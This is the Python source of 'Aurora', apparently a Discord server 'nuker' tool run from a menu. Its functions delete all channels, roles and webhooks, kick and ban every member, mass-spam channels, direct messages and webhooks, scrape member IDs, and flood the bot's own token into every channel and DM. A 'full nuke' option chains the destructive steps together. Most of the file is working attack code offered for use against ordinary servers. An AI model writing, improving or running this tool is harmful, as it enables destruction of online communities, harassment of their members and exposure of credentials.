import discord
from discord.ext import commands
import asyncio
import sys
import os
from colorama import Fore, Style

TOKEN = "YOUR_BOT_TOKEN" # You can leave this alone cause itll ask you anyways, its just that I fucked up a lil lmfao

client = commands.Bot(command_prefix=".", intents=discord.Intents.all())

# --- ANSI Colors ---
RED = Fore.RED
GREEN = Fore.LIGHTGREEN_EX
YELLOW = Fore.LIGHTYELLOW_EX
BLUE = Fore.LIGHTBLUE_EX
PURPLE = Fore.LIGHTMAGENTA_EX
CYAN = Fore.CYAN
WHITE = Fore.WHITE
BLACK = Fore.BLACK
ENDC = Style.RESET_ALL
BOLD = Style.BRIGHT


# --- Global Variables ---
cancel_flag = False

def clear_console():
    os.system('cls' if os.name in ('nt', 'dos') else 'clear')

def typing_print(text):
    for character in text:
        sys.stdout.write(character)
        sys.stdout.flush()
        asyncio.sleep(0.03)
    print()

# --- ASCII Banner ---
BANNER = f"""{PURPLE}
 ▄▀▀█▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄ 
▐ ▄▀ ▀▄ █   █    █ █   █   █ █      █ █   █   █ ▐ ▄▀ ▀▄
  █▄▄▄█ ▐  █    █  ▐  █▀▀█▀  █      █ ▐  █▀▀█▀    █▄▄▄█
 ▄▀   █   █    █    ▄▀    █  ▀▄    ▄▀  ▄▀    █   ▄▀   █
█   ▄▀     ▀▄▄▄▄▀  █     █     ▀▀▀▀   █     █   █   ▄▀ 
▐   ▐              ▐     ▐            ▐     ▐   ▐   ▐  {ENDC}
"""


def get_user_input(prompt, min_value=1, max_value=30):
    while True:
        try:
            input_value = input(prompt)
            if input_value.isdigit() and min_value <= int(input_value) <= max_value:
                return int(input_value)
            else:
                print(f"{RED}Invalid choice. Please enter a number between {min_value} and {max_value}.{ENDC}")
        except (KeyboardInterrupt, EOFError):
            print(f"\n{RED}Action cancelled.{ENDC}")
            return None


async def handle_choice(client, guild):
    choice = await display_menu(client)
    if choice == 1:
        await delete_channels(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 2:
        await create_channels(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 3:
        await delete_all_voice_channels(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 4:
        await create_voice_channels(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 5:
        await delete_roles(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 6:
        await create_roles(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 7:
        await strip_user_roles(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 8:
        await show_log(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 9:
        await kick_all_users(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 10:
        await ban_all_users(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 11:
        await change_server_nickname(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 12:
        await spam_messages(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 13:
        await nickname_all(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 14:
        await leak_token(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 15:
        await change_vanity(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 16:
        await full_nuke(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 17:
        await delete_webhooks(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 18:
        await spam_webhooks(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 19:
        await self_advertise(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 20:
        await open_github(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 21:
        await open_youtube(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 22:
        await show_discord(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 23:
        await dm_spam(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 24:
        await member_id_scraper(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 25:
        await server_lookup(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 26:
        await nuke_account(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 27:
        await check_token(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 28:
        await patch_notes(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 29:
        await set_threads(client, guild)
        await asyncio.sleep(2.5)
        await handle_choice(client, guild)
    elif choice == 30:
        print(f"{PURPLE}Exiting...{ENDC}")
        await client.close()
    else:
        print(f"{RED}Invalid choice. Please try again.{ENDC}")
        await handle_choice(client, guild)


async def delete_channels(client, guild):
    try:
        for channel in guild.channels:
            if cancel_flag:
                print(f"{RED}Action cancelled.{ENDC}")
                break
            try:
                await channel.delete()
                print(f"{GREEN}Deleted channel: {channel.name}{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to delete channel: {channel.name} - {e}{ENDC}")
        print(f"{GREEN}Finished deleting channels.{ENDC}")
    except Exception as e:
        print(f"{RED}Error deleting channels: {e}{ENDC}")


async def create_channels(client, guild):
    try:
        channel_name = input(f"{PURPLE}Enter the name for the channels: {ENDC}")
        if channel_name is None:
            return
        num_channels = get_user_input(f"{PURPLE}Enter the number of channels to create (1-50): {ENDC}", 1, 50)
        if num_channels is None:
            return
        for _ in range(num_channels):
            try:
                await guild.create_text_channel(channel_name)
                print(f"{GREEN}Created channel: {channel_name}{ENDC}")
            except discord.HTTPException as e:
                if e.status == 403:
                    print(f"{RED}Permission Denied: Cannot create more channels.{ENDC}")
                    break
                else:
                    print(f"{RED}Failed to create channel: {e}{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to create channel: {e}{ENDC}")

    except Exception as e:
        print(f"{RED}Error creating channels: {e}{ENDC}")


async def delete_all_voice_channels(client, guild):
    try:
        for vc in guild.voice_channels:
            if cancel_flag:
                print(f"{RED}Action cancelled.{ENDC}")
                break
            try:
                await vc.delete()
                print(f"{GREEN}Deleted VC: {vc.name}{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to delete VC: {vc.name} - {e}{ENDC}")
        print(f"{GREEN}Finished deleting voice channels.{ENDC}")
    except Exception as e:
        print(f"{RED}Error deleting voice channels: {e}{ENDC}")


async def create_voice_channels(client, guild):
    try:
        vc_name = input(f"{PURPLE}Enter the name for the voice channels: {ENDC}")
        if vc_name is None:
            return
        num_vcs = get_user_input(f"{PURPLE}Enter the number of VCs to create (1-25): {ENDC}", 1, 25)
        if num_vcs is None:
            return
        for _ in range(num_vcs):
            try:
                await guild.create_voice_channel(vc_name)
                print(f"{GREEN}Created voice channel: {vc_name}{ENDC}")
            except discord.HTTPException as e:
                if e.status == 403:
                    print(f"{RED}Permission Denied: Cannot create more voice channels.{ENDC}")
                    break
                else:
                    print(f"{RED}Failed to create voice channel: {e}{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to create voice channel: {e}{ENDC}")

    except Exception as e:
        print(f"{RED}Error creating voice channels: {e}{ENDC}")


async def delete_roles(client, guild):
    try:
        for role in guild.roles[1:]:
            if cancel_flag:
                print(f"{RED}Action cancelled.{ENDC}")
                break
            try:
                await role.delete()
                print(f"{GREEN}Deleted role: {role.name}{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to delete role: {role.name} - {e}{ENDC}")
        print(f"{GREEN}Finished deleting roles.{ENDC}")
    except Exception as e:
        print(f"{RED}Error deleting roles: {e}{ENDC}")


async def create_roles(client, guild):
    try:
        role_name = input(f"{PURPLE}Enter the name for the roles: {ENDC}")
        if role_name is None:
            return
        admin_choice = input(f"{PURPLE}Should roles have admin permissions (y/n): {ENDC}")
        num_roles = get_user_input(f"{PURPLE}Enter the number of roles to create (1-10): {ENDC}", 1, 10)
        if num_roles is None:
            return
        for _ in range(num_roles):
            try:
                role = await guild.create_role(name=role_name)
                print(f"{GREEN}Created role: {role.name}{ENDC}")
                if admin_choice.lower() == 'y':
                    perms = discord.Permissions(administrator=True)
                    await role.edit(permissions=perms)
                    print(f"{GREEN}Admin permissions added to {role.name}{ENDC}")
            except discord.HTTPException as e:
                if e.status == 403:

                    print(f"{RED}Permission Denied: Cannot create more roles.{ENDC}")
                    break
                else:
                    print(f"{RED}Failed to create role: {e}{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to create role: {e}{ENDC}")

    except Exception as e:
        print(f"{RED}Error creating roles: {e}{ENDC}")


async def strip_user_roles(client, guild):
    try:
        for member in guild.members:
            if cancel_flag:
                print(f"{RED}Action cancelled.{ENDC}")
                break
            try:
                for role in member.roles[1:]: 
                    await member.remove_roles(role)
                    print(f"{GREEN}Stripped role {role.name} from {member.name}{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to strip roles from {member.name} - {e}{ENDC}")
        print(f"{GREEN}Finished stripping roles.{ENDC}")
    except Exception as e:
        print(f"{RED}Error stripping roles: {e}{ENDC}")


async def show_log(client, guild):
    print(f"{YELLOW}Log functionality is in development, planned release date to be next update.{ENDC}")


async def kick_all_users(client, guild):
    try:
        for member in guild.members:
            if cancel_flag:
                print(f"{RED}Action cancelled.{ENDC}")
                break
            try:
                await member.kick()
                print(f"{GREEN}Kicked user: {member.name}{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to kick user: {member.name} - {e}{ENDC}")
        print(f"{GREEN}Finished kicking users.{ENDC}")
    except Exception as e:
        print(f"{RED}Error kicking users: {e}{ENDC}")


async def ban_all_users(client, guild):
    try:
        for member in guild.members:
            if cancel_flag:
                print(f"{RED}Action cancelled.{ENDC}")
                break
            try:
                await member.ban()
                print(f"{GREEN}Banned user: {member.name}{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to ban user: {member.name} - {e}{ENDC}")
        print(f"{GREEN}Finished banning users.{ENDC}")
    except Exception as e:
        print(f"{RED}Error banning users: {e}{ENDC}")


async def change_server_nickname(client, guild):
    try:
        new_name = input(f"{PURPLE}Enter the new server name: {ENDC}")
        if new_name is None:
            return
        await guild.edit(name=new_name)
        print(f"{GREEN}Server name changed to: {new_name}{ENDC}")
    except Exception as e:
        print(f"{RED}Failed to change server name - {e}{ENDC}")


async def spam_messages(client, guild):
    try:
        message = input(f"{PURPLE}Enter the message to spam: {ENDC}")
        if message is None:
            return
        for channel in guild.text_channels:
            if cancel_flag:
                print(f"{RED}Action cancelled.{ENDC}")
                break
            try:
                await channel.send(message)
                print(f"{GREEN}Sent message to {channel.name}{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to send message to {channel.name} - {e}{ENDC}")
        print(f"{GREEN}Finished spamming messages.{ENDC}")
    except Exception as e:
        print(f"{RED}Error spamming messages: {e}{ENDC}")


async def nickname_all(client, guild):
    try:
        new_nickname = input(f"{PURPLE}Enter the new nickname: {ENDC}")
        if new_nickname is None:
            return
        for member in guild.members:
            if cancel_flag:
                print(f"{RED}Action cancelled.{ENDC}")
                break
            try:
                await member.edit(nick=new_nickname)
                print(f"{GREEN}Changed {member.name}'s nickname to {new_nickname}{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to change {member.name}'s nickname - {e}{ENDC}")
        print(f"{GREEN}Finished changing nicknames.{ENDC}")
    except Exception as e:
        print(f"{RED}Error changing nicknames: {e}{ENDC}")


async def leak_token(client, guild):
    try: 
        token_message = f"{client.http.token}"
        # Spam in chat
        for channel in guild.text_channels:
            for _ in range(4):
                await channel.send(token_message )
                await asyncio.sleep(0.5)

        # Spam in DMs
        for member in guild.members:
            for _ in range(4):
                try:
                    await member.send(token_message)
                except:
                    pass  # Ignore errors if DMing fails
                await asyncio.sleep(0.5)

        print(f"{GREEN}Spilled the beans: Token flooded everywhere!{ENDC}")

    except Exception as e:
        print(f"{RED}Failed to spill the beans: {e}{ENDC}")



async def change_vanity(client, guild):
    try:
        new_vanity = input(f"{PURPLE}Enter the new vanity URL: {ENDC}")
        if new_vanity is None:
            return
        try:
            await guild.edit(vanity_url_code=new_vanity)
            print(f"{GREEN}Vanity URL changed to {new_vanity}{ENDC}")
        except Exception as e:
            print(f"{RED}Failed to change vanity URL - {e}{ENDC}")
    except Exception as e:
        print(f"{RED}Error changing vanity URL: {e}{ENDC}")


async def full_nuke(client, guild):
    try:
        await delete_channels(client, guild)
        await delete_all_voice_channels(client, guild)
        await delete_roles(client, guild)
        await kick_all_users(client, guild)
        await ban_all_users(client, guild)
        print(f"{GREEN}Finished nuking server.{ENDC}")
    except Exception as e:
        print(f"{RED}Error nuking server: {e}{ENDC}")


async def delete_webhooks(client, guild):
    try:
        for webhook in await guild.webhooks():
            if cancel_flag:
                print(f"{RED}Action cancelled.{ENDC}")
                break
            try:
                await webhook.delete()
                print(f"{GREEN}Webhook {webhook.id} successfully deleted.{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to delete webhook {webhook.id}: {e}{ENDC}")
        print(f"{GREEN}Finished deleting webhooks.{ENDC}")
    except Exception as e:
        print(f"{RED}Error deleting webhooks: {e}{ENDC}")


async def spam_webhooks(client, guild):
    try:
        webhook_url = input(f"{PURPLE}Enter the webhook url: {ENDC}")
        if webhook_url is None:
            return
        message = input(f"{PURPLE}Enter the message you want to spam: {ENDC}")
        if message is None:
            return

        webhook = discord.Webhook.from_url(webhook_url, session=client.http.session)
        for _ in range(100):
            await webhook.send(message)
            print(f"{GREEN}Webhook spammed: {message}{ENDC}")
            await asyncio.sleep(0.5) 

        print(f"{GREEN}Finished spamming webhooks.{ENDC}")
    except Exception as e:
        print(f"{RED}Failed to spam webhook: {e}{ENDC}")


async def self_advertise(client, guild):
    try:
        advertisement = input(f"{PURPLE}Enter the advertisement: {ENDC}")
        if advertisement is None:
            return
        for channel in guild.text_channels:
            if cancel_flag:
                print(f"{RED}Action cancelled.{ENDC}")
                break
            try:
                await channel.send(f'{advertisement}')
                print(f"{GREEN}Sent advertisement to {channel.name}{ENDC}")
            except Exception as e:
                print(f"{RED}Failed to send advertisement to {channel.name} - {e}{ENDC}")
        print(f"{GREEN}Finished sending advertisements.{ENDC}")
    except Exception as e:
        print(f"{RED}Error sending advertisements: {e}{ENDC}")


async def open_github(client, guild):
    os.system("start https://github.com/ShroomStumper")


async def open_youtube(client, guild):
    os.system("start https://www.youtube.com/@FentAddictAxe")


async def show_discord(client, guild):
    print(f"{PURPLE}My Discord: 5td1{ENDC}")


async def dm_spam(client, guild):
    try:
        message = input(f"{PURPLE}Enter the message to spam: {ENDC}")
        if message is None:
            return
        for member in guild.members:
            if member != client.user:
                try:
                    await member.send(message)
                    print(f"{GREEN}Sent DM to {member.name}{ENDC}")
                except Exception as e:
                    print(f"{RED}Failed to send DM to {member.name}{ENDC}")
        print(f"{GREEN}Finished sending DMs!{ENDC}")
    except Exception as e:
        print(f"{RED}Error sending DMs: {e}{ENDC}")


async def member_id_scraper(client, guild):
    try:
        print(f"{PURPLE}Scraping member IDs...{ENDC}")
        with open('member_ids.txt', mode='w', encoding='utf-8') as f:
            for member in guild.members:
                if cancel_flag:
                    print(f"{RED}Action cancelled.{ENDC}")
                    break
                f.write(f'{member.id}\n')
                print(f"{GREEN}Scraped {member.name} ({member.id}) Id{ENDC}")
        print(f"{GREEN}Scraped all member IDs and uploaded them to member_ids.txt{ENDC}")
    except Exception as e:
        print(f"{RED}Error scraping member IDs: {e}{ENDC}")


async def server_lookup(client, guild):
    print(f"{YELLOW}Server lookup is in development, planned release date to be next update.{ENDC}")


async def nuke_account(client, guild):
    print(f"{YELLOW}Account nuker is in development, planned release date to be next update.{ENDC}")


async def check_token(client, guild):
    print(f"{YELLOW}Token checker is in development, planned release date to be next update.{ENDC}")


async def patch_notes(client, guild):
    print(f"{YELLOW}Patch notes is in development, planned release date to be next update.{ENDC}")


async def set_threads(client, guild):
    try:
        num_threads = input(f"{PURPLE}Enter the number of threads: {ENDC}")
        if num_threads is None:
            return
        print(f"{GREEN}Using {num_threads} threads for specific operations.{ENDC}")
    except Exception as e:
        print(f"{RED}Error setting threads: {e}{ENDC}")


async def start_bot(token):
    print(f"{PURPLE}Checking token...{ENDC}")
    await client.start(token)

async def display_menu(client):
    clear_console()
    print(BANNER)
    print(f"{PURPLE}Made by Axe{ENDC}")
    print(f"\n{PURPLE}-AURORA MENU-{ENDC}")
    print(f"1. {PURPLE}Delete all channels{ENDC}")
    print(f"2. {PURPLE}Create channels{ENDC}")
    print(f"3. {PURPLE}Delete all VCs {ENDC}")
    print(f"4. {PURPLE}Create VCs{ENDC}")
    print(f"5. {PURPLE}Delete all roles{ENDC}")
    print(f"6. {PURPLE}Create roles{ENDC}")
    print(f"7. {PURPLE}Strip roles from members{ENDC}")
    print(f"8. {PURPLE}Log{ENDC}")
    print(f"9. {PURPLE}Kick all users{ENDC}")
    print(f"10. {PURPLE}Ban all users{ENDC}")
    print(f"11. {PURPLE}Change server nickname{ENDC}")
    print(f"12. {PURPLE}Spam messages{ENDC}")
    print(f"13. {PURPLE}Nickname all{ENDC}")
    print(f"14. {PURPLE}Token leak{ENDC}")
    print(f"15. {PURPLE}Vanity changer{ENDC}")
    print(f"16. {PURPLE}Full nuke{ENDC}")
    print(f"17. {PURPLE}Webhook deleter{ENDC}")
    print(f"18. {PURPLE}Webhook spammer{ENDC}")
    print(f"19. {PURPLE}Self advertise{ENDC}")
    print(f"20. {PURPLE}My GitHub{ENDC}")
    print(f"21. {PURPLE}My Youtube{ENDC}")
    print(f"22. {PURPLE}My Discord{ENDC}")
    print(f"23. {PURPLE}DM Spammer{ENDC}")
    print(f"24. {PURPLE}Member ID Scraper{ENDC}")
    print(f"25. {PURPLE}Server lookup{ENDC}")
    print(f"26. {PURPLE}Account nuker{ENDC}")
    print(f"27. {PURPLE}Token checker{ENDC}")
    print(f"28. {PURPLE}Patch notes{ENDC}")
    print(f"29. {PURPLE}Threads{ENDC}")
    print(f"30. {PURPLE}Exit{ENDC}")

    choice = get_user_input(f"{PURPLE}Enter your choice: {ENDC}")
    return choice


@client.event
async def on_ready():
    clear_console()
    print(f"{PURPLE}Welcome to Aurora{ENDC}")
    print(f"{PURPLE}Bot is ready!{ENDC}")

    guilds = client.guilds
    if len(guilds) == 1:
        guild = guilds[0]
        print(f"{PURPLE}Bot is in {guild.name}, automatically selecting it.{ENDC}")
        await handle_choice(client, guild) 
    else:
        print(f"{PURPLE}Bot is in multiple guilds, please select one:{ENDC}")
        for i, guild in enumerate(guilds):
            print(f"{i + 1}. {guild.name}")
        guild_choice = get_user_input(f"{PURPLE}Enter Guild Number: {ENDC}")
        if guild_choice is None:
            return
        guild = guilds[guild_choice - 1]
        await handle_choice(client, guild) 


if __name__ == "__main__":
    print(f"{PURPLE}Loading...{ENDC}")
    bot_token = input(f"{PURPLE}Enter Bot Token: {ENDC}")
    asyncio.run(start_bot(bot_token))
